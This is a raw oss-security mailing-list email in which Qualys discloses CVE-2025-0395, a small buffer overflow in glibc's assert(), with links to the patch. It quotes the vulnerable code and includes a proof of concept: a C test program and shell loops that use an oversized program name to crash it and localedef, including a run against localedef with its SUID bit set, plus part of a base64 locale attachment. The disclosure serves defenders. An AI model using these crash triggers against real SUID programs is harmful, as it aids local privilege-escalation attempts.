Received: (qmail 1495 invoked by uid 550); 22 Jan 2025 13:41:51 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 1440 invoked from network); 22 Jan 2025 13:41:51 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=
	content-type:date:from:message-id:mime-version:subject:to; s=
	qualyscom; bh=99Ux+C8cpFXYCu28AtFLRedjC2OMfUNZ4F9HqAsaHb8=; b=Jg
	LmYDloosTSToRHEUYqW+YtRpXu8/wmJzXgwyQVmjFX3VqNj6A2PqQkJhw5+eYTHG
	ps5FYULjRn3n9ZQ6IbXherKYpUQRTHlkhjdAShEQmLhUhvBadEbcj5uXqqGDo1YI
	hG62wymEg3PGSfmNi+bV9S8O7vjfTLd5kPZi0cqGPL09xB8VtTyIQJRodFqvdAqY
	Qa0FSkqtRDyYgbe0JrbyMtRuZZ30aJdl5J/UZsLqk+Z7i7ogvkQyGQ7Nyvsu3Jhp
	zPG63WyNCsk/GwLg1XFridi+fOEI2ZA18yS1Pdf00PeUcXVcRKSPtT8fHrm15Sbi
	xVepHlbMwMUUar3s/PBQ==
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=nSlDB9jECKlWv5HKgwBoL/VEgJAGrfTLICA9mXwgKXKI3N/5OOylWVQlDu6yDLw7DGVy3iIUFCZRdWwi6NUQ1YjXuH2BpuZLp9kLGdfbH65Pz8Fcui811O8BylVK1jny8tKPgBGhc1RoG2IWwiJhHgZWUeh15/J5oYCUf4lIdUNednqaU/6qyZqU8PyI01SgQ20nYwOlh5N4c+BzvhSllXIivQ0pxJbTJAnnrTbX4IB6zAg+kRtyuiW5AGobuGt4oSxv9JkgyRO6Vd+x1Y/86YkUWSHIhCtia1Z1hNsPFiDOfpX9gu7OA1dkLz/CTBTnbmcA6A2CHsdtXmhXCCy4lQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=99Ux+C8cpFXYCu28AtFLRedjC2OMfUNZ4F9HqAsaHb8=;
 b=H1ccWTHZcOBQLsV0RK97QtZNcEY0muSnGDey2Ty7hPnlafJThTUUnKXB6NtCbdCC0bkKG6P9d/WzmBMcNzxXvZyr9DVK46a0KCA6eANuZBANPKSawcNU84E/SKVZz7i8IYLVxPxaoSQp5pPfYr/spRLWDLWV17nILM0ujcWeJbTFwMHbmcZCCJa8CtPH557Y5L9YprnqODqoH1omSwQpKMRcRSl0JlqBjC92MTdEUoK+aaV2WFemWQ28hPxPVgkq3IwauVRh9H3/vwaEJ0AukRuQ+9kyeg5qVoEAKIdOsZ09efyylE1E3rT8G9qEldZFwpEALRxZ7rtkyQVn+AN1Uw==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=qualys.com; dmarc=pass action=none header.from=qualys.com;
 dkim=pass header.d=qualys.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=qualys.onmicrosoft.com; s=selector1-qualys-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=99Ux+C8cpFXYCu28AtFLRedjC2OMfUNZ4F9HqAsaHb8=;
 b=RpUp2FPml7TnZi5jAG+SB+9OFO+6QzZPjKWbGB4QizrsfEYF26R2O+/egox2GbQByyaggjHiedrnFrJ7hYrCrJU5d0Z9p8OVEmBC/OarN2stdfJd8CTQ1G8mJYlkmyZf8SAgXjLZbTANuHZVmMuqgHQ/DhAMPBu2kADa/AnySgRxMO0tSVvz0XlvDn1P3iw3hzpAoXsvqhDcCD+eiTp/EZtfzfGRdxBVDG47fwqYhs+g/S0DDgOZKQEpfoMLFNnLTM3yoVbK7CvwsaoRZDv0Ag9Ffsn4v/NntfaWuABAso1qFp/ijQ7beoLf4Cz49sFIJox13VDDWVln++h7ldz8Ig==
From: Qualys Security Advisory <qsa@qualys.com>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: CVE-2025-0395: Buffer overflow in the GNU C Library's assert()
Thread-Index: AQHbbNNbZRguQNWsWkGl8AAXT8Ti0Q==
Date: Wed, 22 Jan 2025 13:41:36 +0000
Message-ID: <20250122134128.GA29327@localhost.localdomain>
Accept-Language: en-US
Content-Language: en-US
X-MS-Has-Attach: yes
X-MS-TNEF-Correlator:
x-ms-publictraffictype: Email
x-ms-traffictypediagnostic: SJ0PR06MB6910:EE_|BY5PR06MB6499:EE_
x-ms-office365-filtering-correlation-id: ce5914bf-b058-437b-a7cc-08dd3aea7e08
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam: BCL:0;ARA:13230040|376014|1800799024|366016|38070700018;
x-microsoft-antispam-message-info:
 =?us-ascii?Q?mXkzsMipv+lUUVvbqfBjClJORMzK4G3MoMs/d1cP5qBNAk0SmpJk/n/UfIRh?=
 =?us-ascii?Q?3rJEtjfZ0iRj2IXud7BtvRt3VKLBGKhxMiyhgNl1Q24LepndgdAr5xIFXy8i?=
 =?us-ascii?Q?KGqhH8kl4siAv7YHzAuuwGKrW2y5ANE4IFuhnKzl1eMS5efwg4Yllu6ItK+c?=
 =?us-ascii?Q?VywXyNRl0eyLDo6RyZbdBahaK+rRBGQQ9rqBR5sZ5txlBk9wQbk9lUw9SVNo?=
 =?us-ascii?Q?OjP6Osa/xkI4svjYOJbWYrINyeyZWK49QKt8O7GThMcEbo+TtSypgrbVN/yb?=
 =?us-ascii?Q?dZFz7ufy9sTd6SPf/smwe4QHp6oiqJ8hByGGZ89SRzGh7haVfmf6WtLcRyex?=
 =?us-ascii?Q?rxqUEhY7RtcCpoSZDUOInoeE2sOCmY6JWQ0An238obX2z0/HFPooXR4BbjhV?=
 =?us-ascii?Q?lF27oKjpRBarkoi16iHDy9ULd13ulJvLSYpGyDTim85xqE1YXXA3Za0X21UT?=
 =?us-ascii?Q?N+BqHYk6u2iD5y63TnmGKfxG1aVXL5TXrwNAnaJqoE9ot6TAkMyNyC6a2xq6?=
 =?us-ascii?Q?mKecsZt3NpA78EiRDFEsP+H9K2m4RlZ5fHXX8EYtPshrd/2IfkSmZfpZHaBB?=
 =?us-ascii?Q?zDhij0Q6314+d9pJoLs9oNawraSHnpN4JeLXnu8dkTfrTt2ZroY829ufLJ1A?=
 =?us-ascii?Q?f4lWfoGHwCJ4Rk3W8y1cd5JYA87W+VhGRyG62cRnw41ZmKc0XkKOq1wU6wEn?=
 =?us-ascii?Q?/b3wOkY0uFksVSQMhYW2jA6Jzek7XbzuOS/ohjM71HQGqxsR4UcSG8LgojFW?=
 =?us-ascii?Q?inlHgRGeOSK3EHIJ29GxubZF+5a0NS79j6UXibDVtzpz/Qm/5IRY6jsYhQYn?=
 =?us-ascii?Q?m1zhkP3q33sXU5vAduvt90G+MNRgwsmADiZGpda5RmDx7qBhGT6UFvEg6Unp?=
 =?us-ascii?Q?3EcDkZy7BAtkinv/sKynlPtRL4P/gWauRwN2+t7MNxj8HXSZynFfAKwjG3j9?=
 =?us-ascii?Q?/kcLTi8n+2RT6r7VpNkfCgd52UvWCCCQ4KJiH0SRmuK93UeIUqd81U7/EXal?=
 =?us-ascii?Q?/QV6JY+nXVuUxRFqkQLNnF5bYtibyHNkVyLHYiAaSYb5STbAhXu16LfL/zyj?=
 =?us-ascii?Q?Lp35Ic46X22M29i2YRHSQRuMASMS61PLWOdIjbEvcKCH+k0QG49v1B1FXQe+?=
 =?us-ascii?Q?5jcCaoZRZN+JBzwFryFaDPhrnyV+SfXoLkDekZCVEpJmZp2GG3sO4j88V13V?=
 =?us-ascii?Q?VTJp8BaXaGD/6ejF5ECDstWysM1XQia2koS8aeJLDfWltjyzKyi3Hs1U98Ro?=
 =?us-ascii?Q?JSa6RjR0Wbx8++Bx++iiLAviiZM1d5KfytVBaYsuJ8vVGwGzp4XlY2AuxMOu?=
 =?us-ascii?Q?r43ARcU9EwhCb4X9AOab7AHr0zBOfdYx1raIXVaStX50Ab1oZoqnC4FP038l?=
 =?us-ascii?Q?Oi7rCF8S5gvKdBsRqzbgeOMgINVh4HlwKiUxx0wypAKYDKoDRA=3D=3D?=
x-forefront-antispam-report:
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:SJ0PR06MB6910.namprd06.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(376014)(1800799024)(366016)(38070700018);DIR:OUT;SFP:1102;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0:
 =?us-ascii?Q?NSwrobqr7CvWnrlE+xvHtF8jS+sY7w6Fn/HGcTl7AN7AeHNpkLnQAuqdIA+x?=
 =?us-ascii?Q?r2SJeEnMhaSsusotuACIyF8dLZtLqa3SS8VScJccTk5obSt74VdSTkIv2JR2?=
 =?us-ascii?Q?Sb2y/4Btrg3vm4H/3AKYu/ctFObiP3VYBtRMnsgliqvBl0RT5LiCyB/uBjBi?=
 =?us-ascii?Q?sTvgl6XzNEoPYGWYFLrbJOqC6ZY2wdWUYudtknKwjpxlQuD73JO+JP0kbkXB?=
 =?us-ascii?Q?BY6Z3SM6Va33VzMCZBRc1kT/zErTE+9Dmzy97BHL9xYj8OuKfAwWwW1e1iUo?=
 =?us-ascii?Q?NCZ8/38EzfwGptgkM/RZCqNmSPa4lVH5dCcmig5EVuAp+mOvFUBwfYXwesYH?=
 =?us-ascii?Q?yInELyHJ8UC4mI6dfefx9CdkH/0yhB5kLetxtV31mytPtvwYpMKPVl802/ub?=
 =?us-ascii?Q?sEd0tvcHA5LnQOB3oEHDIP37TxMnNQXeJoSBjsML7MeghZfG9XNQ6Hjpy2BY?=
 =?us-ascii?Q?axQAJiWDOCHGEILSYdlwLtTKIS2xEXnYcIbWKsRXROOCiTUIqW7zPTxEWQSy?=
 =?us-ascii?Q?JkLDZ4h6IuRk86YWmgj0TUiZN8RGJezwe7jBKDXAantWv9MBIF34oolVQwuI?=
 =?us-ascii?Q?SLw0KOTzQfXKShqrsUCfJBxS0dRKnnuGLOG0zhHqInPXLcU5kqlsVs3A5989?=
 =?us-ascii?Q?zXpMilot9YpHvitfrwCDvhb2UzX4ipYD5/LGLalE6dFXRdCRAVmUWMtT3oI4?=
 =?us-ascii?Q?OMRb4we+A57OPSjcNk2TRkf+40HE7Yd1HDFStuEtJC4dOL+MIV7Xv/y/oWBw?=
 =?us-ascii?Q?ot/RoQfyIv//qulEGTuWtPTgA/h6axtjUWWBB9irGLe+7ursp51sZM+KgRqx?=
 =?us-ascii?Q?lV6km3Zejt+5jlHb1dvfEJ6b6gGoNr0Nnh9YSQTsRZKVCLGrHIpXhM5hTeeD?=
 =?us-ascii?Q?2xRo//Jtt9bVzWnB2mP6m9N+N0+5i5jeVZoceNQoJm/Lzj7kH9GpkaMxpjsc?=
 =?us-ascii?Q?n/ln28aFpr5XxrI2YIVnvsfkxopGhpGerXZcLYZbkjHVyfDbHLtbbjujOHYy?=
 =?us-ascii?Q?Gf4CzZAgwMVBfpkqyU9Nb3KXSrezCXBMLKoaZEDJeCmGTJ8d70YTiy1tIjct?=
 =?us-ascii?Q?UGBBoLLi1E/jJf9CDhnpdXGGIyOIfwjgiQHhnvKHce1gL4WxuwsyBlDQhYUA?=
 =?us-ascii?Q?OsNVLyXha1IU4CaD8iQyLvhDODBswJITD19QKIFD6mFsa4zAgIb0ylssdQAI?=
 =?us-ascii?Q?LWG4sA0Qn8yLKVakCVRgnE8jN6f36uUmynha8MniegjMo+P40JVdyvg7BAXl?=
 =?us-ascii?Q?rF0bC3P22xml82L3sAOBc+6H18sQnvP0h5waRH0rvYGkObCO6PnreVtw75Ux?=
 =?us-ascii?Q?p2EKlsC1drp/9Joh6QuQKMGVoWKXTv5LRMx5K1JpM9kFLp75YZztpE8JZGZd?=
 =?us-ascii?Q?ayU9EA17pPX7HG9s++wZyPZWQJv9Ld2SuEU9oiQvRmrpnSscdIK8z0hYjhU0?=
 =?us-ascii?Q?fuOcRN1QMerAdlKUVm7evj7k7k5Y/4aCH/Lf6QGM8z6TvrZiz/lGlOXg8jN4?=
 =?us-ascii?Q?18soKQ35XryQgrS6vy5B6T72fCpdsnJREgEoDf/A6kEUsBEYXqQaqqx5RJVP?=
 =?us-ascii?Q?cujfI+MWWPT9bxMG/VSHUvmrLMChIFYHjcJQCGgOPQmnABF3PHP+lSpOqcDo?=
 =?us-ascii?Q?MQ9xkmmu86DtqJ83678NICg=3D?=
Content-Type: multipart/mixed;
	boundary="_002_20250122134128GA29327localhostlocaldomain_"
MIME-Version: 1.0
X-OriginatorOrg: qualys.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: SJ0PR06MB6910.namprd06.prod.outlook.com
X-MS-Exchange-CrossTenant-Network-Message-Id: ce5914bf-b058-437b-a7cc-08dd3aea7e08
X-MS-Exchange-CrossTenant-originalarrivaltime: 22 Jan 2025 13:41:36.7210
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 81a9ef9a-9a98-4b00-886a-895a603bc029
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: CRAyZ7U9iAJWpIBabNs3cj1vaZjNUPz++Wici8TRXtzR/Vz4nPECHsXHNFm81b2roQ/Coj+H17M/AxV7MKquaRJ1nqUATlztM7Q3DFfKPSk=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: BY5PR06MB6499
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.272,Aquarius:18.0.1057,Hydra:6.0.680,FMLib:17.12.68.34
 definitions=2025-01-22_06,2025-01-22_02,2024-11-22_01
Subject: [oss-security] CVE-2025-0395: Buffer overflow in the GNU C Library's assert()

--_002_20250122134128GA29327localhostlocaldomain_
Content-Type: text/plain; charset="us-ascii"
Content-ID: <5A0C8532D4F146479BC8A1401568CE2D@namprd06.prod.outlook.com>
Content-Transfer-Encoding: quoted-printable

Hi all,

On January 10, 2025, we contacted the GNU C Library's security team
about a buffer overflow that we discovered in assert()'s implementation
(CVE-2025-0395). Because this vulnerability seems relatively minor (for
reasons detailed below), it was decided that it could be discussed and
patched publicly, without an embargo.

Today (January 22, 2025) a Bugzilla entry and a patch proposal for this
vulnerability have been published:

  https://sourceware.org/bugzilla/show_bug.cgi?id=3D32582
  https://patchwork.sourceware.org/project/glibc/list/?series=3D43300
  https://sourceware.org/pipermail/libc-alpha/2025-January/164164.html
  https://sourceware.org/pipermail/libc-alpha/2025-January/164165.html
  https://sourceware.org/pipermail/libc-alpha/2025-January/164166.html

For more details and a proof of concept, below are the two emails that
we sent to the GNU C Library's security team. We are of course at your
disposal for questions, comments, and further discussions. Thank you
very much!

With best regards,
-- the Qualys Security Advisory team

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

While looking into commit 6f0ea84 ("assert: Remove the use of %n from
__assert_fail_base (BZ #32456)"), we spotted an mmap-based buffer
overflow in assert() (more precisely, in __assert_fail_base()),
introduced in 2011 by commit f8a3b5b ("Use mmap for allocation of
buffers used for __abort_msg"):

------------------------------------------------------------------------
356 struct abort_msg_s
357 {
358   unsigned int size;
359   char msg[0];
360 };
------------------------------------------------------------------------
 68       total =3D (total + 1 + GLRO(dl_pagesize) - 1) & ~(GLRO(dl_pagesiz=
e) - 1);
 69       struct abort_msg_s *buf =3D __mmap (NULL, total, PROT_READ | PROT=
_WRITE,
 70                                         MAP_ANON | MAP_PRIVATE, -1, 0);
 71       if (__glibc_likely (buf !=3D MAP_FAILED))
 72         {
 73           buf->size =3D total;
 74           strcpy (buf->msg, str);
------------------------------------------------------------------------

- at lines 68-70, a buffer buf is mmap()ed for a copy of the string str
  and its terminating null byte (total + 1 bytes), plus possible padding
  (to a multiple of the page size);

- but at line 73, an extra, unaccounted-for unsigned int (size) is also
  written into this mmap()ed buf;

- so at line 74, the strcpy() overflows buf with the last bytes of str
  (an off-by-one, two, three, or four bytes (the sizeof unsigned int),
  depending on the padding size).

Because the string str includes __progname (the basename() of argv[0]),
a local attacker can ensure that the padding at line 68 is minimal and
can overflow the buffer buf at line 74 (and this works even against a
SUID program that contains an assertion failure). Exploitation of this
vulnerability looks difficult, but cannot be ruled out completely:

- a SUID program that contains a reachable assertion failure is needed;

- the buffer overflow is mmap-based, and at most an off-by-four bytes;

- the attacker does not control the four bytes that overflow the buffer;

- the program is about to die (assert() calls abort(), eventually).

Important note: __libc_message_impl() in sysdeps/posix/libc_fatal.c is
also vulnerable to a very similar buffer overflow.

To validate our findings, we first used the following proof of concept:

------------------------------------------------------------------------
$ cat > poc.c << "EOF"
#include <assert.h>
int
main(const int argc, const char * const argv[])
{
    assert(argc < 3);
    return 0;
}
EOF

$ gcc -o poc poc.c

$ ./poc one two
poc: poc.c:5: main: Assertion `argc < 3' failed.
Aborted

$ wc << "EOF"
: poc.c:5: main: Assertion `argc < 3' failed.
EOF
      1       8      46

$ while true; do
    P=3D"$(((1 + RANDOM % 32) * 4096))"
    L=3D"$((P - (46 + 1)))"
    A=3D"$(perl -e "print 'a' x $L")"
    (exec -a "$A" ./poc one two 2>/dev/null)
    if test "$?" -ne "$((128 + 6))"; then
        echo "$L"
        break
    fi
done

Aborted
Aborted
Aborted
Aborted
Aborted
Aborted
Aborted
Aborted
Segmentation fault
94161
------------------------------------------------------------------------

Next, to validate these findings in a more realistic scenario, we
searched for an assertion failure in one of the programs that are
installed by default on Linux; we found one in localedef, which is not
SUID but is part of the glibc itself ("./fi_FI", which is attached to
this email, is a modified version of the example in "man localedef"):

------------------------------------------------------------------------
$ /usr/bin/localedef -f UTF-8 -i ./fi_FI ./fi_FI.UTF-8
[warning] No definition for LC_CTYPE category found
[warning] No definition for LC_NUMERIC category found
[warning] No definition for LC_TIME category found
localedef: programs/ld-collate.c:1886: collate_finish: Assertion `ruleidx <=
=3D 128' failed.
Aborted

$ wc << "EOF"
: programs/ld-collate.c:1886: collate_finish: Assertion `ruleidx <=3D 128' =
failed.
EOF
      1       8      81

$ while true; do
    P=3D"$(((1 + RANDOM % 32) * 4096))"
    L=3D"$((P - (81 + 1)))"
    A=3D"$(perl -e "print 'a' x $L")"
    (exec -a "$A" localedef -f UTF-8 -i ./fi_FI ./fi_FI.UTF-8 2>/dev/null)
    if test "$?" -ne "$((128 + 6))"; then
        echo "$L"
        break
    fi
done

Aborted
Aborted
Aborted
Aborted
Aborted
Aborted
Aborted
Aborted
Aborted
Aborted
Segmentation fault
85934
------------------------------------------------------------------------

Last, to double-check that this attack also works even against a SUID
program, we temporarily set the SUID bit of localedef:

------------------------------------------------------------------------
# chmod u+s /usr/bin/localedef
------------------------------------------------------------------------
$ while true; do
    P=3D"$(((1 + RANDOM % 32) * 4096))"
    L=3D"$((P - (81 + 1)))"
    A=3D"$(perl -e "print 'a' x $L")"
    (exec -a "$A" localedef -f UTF-8 -i ./fi_FI ./fi_FI.UTF-8 2>/dev/null)
    if test "$?" -ne "$((128 + 6))"; then
        echo "$L"
        break
    fi
done

Aborted
Aborted
Aborted
Aborted
Aborted
Aborted
Aborted
Aborted
Aborted
Aborted
Segmentation fault
44974
------------------------------------------------------------------------
# chmod u-s /usr/bin/localedef
------------------------------------------------------------------------

As we are currently working on several other projects in parallel, we
have not tried to find a real-world vulnerable SUID program.

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Just a quick update:

On Fri, Jan 10, 2025 at 11:01:12PM +0000, Qualys Security Advisory wrote:
> Important note: __libc_message_impl() in sysdeps/posix/libc_fatal.c is
> also vulnerable to a very similar buffer overflow.

Although __libc_message() is in theory vulnerable to the same buffer
overflow as assert(), we double-checked and __libc_message()'s callers
(__libc_fatal(), __fortify_fail(), malloc_printerr(), and assert()s that
are internal to the glibc) never include attacker-controlled or long-
enough strings to trigger this buffer overflow in practice (it should
probably still be fixed, however).

So only assert() calls that come from outside the glibc are vulnerable
to this buffer overflow (because __progname is attacker-controlled).


--_002_20250122134128GA29327localhostlocaldomain_
Content-Type: text/plain; name="fi_FI"
Content-Description: fi_FI
Content-Disposition: attachment; filename="fi_FI"; size=14759;
	creation-date="Wed, 22 Jan 2025 13:41:36 GMT";
	modification-date="Wed, 22 Jan 2025 13:41:36 GMT"
Content-ID: <461F4FADB7030D47BE6ED890DE406433@namprd06.prod.outlook.com>
Content-Transfer-Encoding: base64

Y29tbWVudF9jaGFyICUNCmVzY2FwZV9jaGFyIC8NCg0KTENfQ09MTEFURQ0Kc2VjdGlvbi1zeW1i
b2wgPFhYWDE+DQpzZWN0aW9uLXN5bWJvbCA8WFhYMj4NCnNlY3Rpb24tc3ltYm9sIDxYWFgzPg0K
c2VjdGlvbi1zeW1ib2wgPFhYWDQ+DQpzZWN0aW9uLXN5bWJvbCA8WFhYNT4NCnNlY3Rpb24tc3lt
Ym9sIDxYWFg2Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDc+DQpzZWN0aW9uLXN5bWJvbCA8WFhYOD4N
CnNlY3Rpb24tc3ltYm9sIDxYWFg5Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDEwPg0Kc2VjdGlvbi1z
eW1ib2wgPFhYWDExPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDEyPg0Kc2VjdGlvbi1zeW1ib2wgPFhY
WDEzPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDE0Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDE1Pg0Kc2Vj
dGlvbi1zeW1ib2wgPFhYWDE2Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDE3Pg0Kc2VjdGlvbi1zeW1i
b2wgPFhYWDE4Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDE5Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDIw
Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDIxPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDIyPg0Kc2VjdGlv
bi1zeW1ib2wgPFhYWDIzPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDI0Pg0Kc2VjdGlvbi1zeW1ib2wg
PFhYWDI1Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDI2Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDI3Pg0K
c2VjdGlvbi1zeW1ib2wgPFhYWDI4Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDI5Pg0Kc2VjdGlvbi1z
eW1ib2wgPFhYWDMwPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDMxPg0Kc2VjdGlvbi1zeW1ib2wgPFhY
WDMyPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDMzPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDM0Pg0Kc2Vj
dGlvbi1zeW1ib2wgPFhYWDM1Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDM2Pg0Kc2VjdGlvbi1zeW1i
b2wgPFhYWDM3Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDM4Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDM5
Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDQwPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDQxPg0Kc2VjdGlv
bi1zeW1ib2wgPFhYWDQyPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDQzPg0Kc2VjdGlvbi1zeW1ib2wg
PFhYWDQ0Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDQ1Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDQ2Pg0K
c2VjdGlvbi1zeW1ib2wgPFhYWDQ3Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDQ4Pg0Kc2VjdGlvbi1z
eW1ib2wgPFhYWDQ5Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDUwPg0Kc2VjdGlvbi1zeW1ib2wgPFhY
WDUxPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDUyPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDUzPg0Kc2Vj
dGlvbi1zeW1ib2wgPFhYWDU0Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDU1Pg0Kc2VjdGlvbi1zeW1i
b2wgPFhYWDU2Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDU3Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDU4
Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDU5Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDYwPg0Kc2VjdGlv
bi1zeW1ib2wgPFhYWDYxPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDYyPg0Kc2VjdGlvbi1zeW1ib2wg
PFhYWDYzPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDY0Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDY1Pg0K
c2VjdGlvbi1zeW1ib2wgPFhYWDY2Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDY3Pg0Kc2VjdGlvbi1z
eW1ib2wgPFhYWDY4Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDY5Pg0Kc2VjdGlvbi1zeW1ib2wgPFhY
WDcwPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDcxPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDcyPg0Kc2Vj
dGlvbi1zeW1ib2wgPFhYWDczPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDc0Pg0Kc2VjdGlvbi1zeW1i
b2wgPFhYWDc1Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDc2Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDc3
Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDc4Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDc5Pg0Kc2VjdGlv
bi1zeW1ib2wgPFhYWDgwPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDgxPg0Kc2VjdGlvbi1zeW1ib2wg
PFhYWDgyPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDgzPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDg0Pg0K
c2VjdGlvbi1zeW1ib2wgPFhYWDg1Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDg2Pg0Kc2VjdGlvbi1z
eW1ib2wgPFhYWDg3Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDg4Pg0Kc2VjdGlvbi1zeW1ib2wgPFhY
WDg5Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDkwPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDkxPg0Kc2Vj
dGlvbi1zeW1ib2wgPFhYWDkyPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDkzPg0Kc2VjdGlvbi1zeW1i
b2wgPFhYWDk0Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDk1Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDk2
Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDk3Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDk4Pg0Kc2VjdGlv
bi1zeW1ib2wgPFhYWDk5Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDEwMD4NCnNlY3Rpb24tc3ltYm9s
IDxYWFgxMDE+DQpzZWN0aW9uLXN5bWJvbCA8WFhYMTAyPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDEw
Mz4NCnNlY3Rpb24tc3ltYm9sIDxYWFgxMDQ+DQpzZWN0aW9uLXN5bWJvbCA8WFhYMTA1Pg0Kc2Vj
dGlvbi1zeW1ib2wgPFhYWDEwNj4NCnNlY3Rpb24tc3ltYm9sIDxYWFgxMDc+DQpzZWN0aW9uLXN5
bWJvbCA8WFhYMTA4Pg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDEwOT4NCnNlY3Rpb24tc3ltYm9sIDxY
WFgxMTA+DQpzZWN0aW9uLXN5bWJvbCA8WFhYMTExPg0Kc2VjdGlvbi1zeW1ib2wgPFhYWDExMj4N
CnNlY3Rpb24tc3ltYm9sIDxYWFgxMTM+DQpzZWN0aW9uLXN5bWJvbCA8WFhYMTE0Pg0Kc2VjdGlv
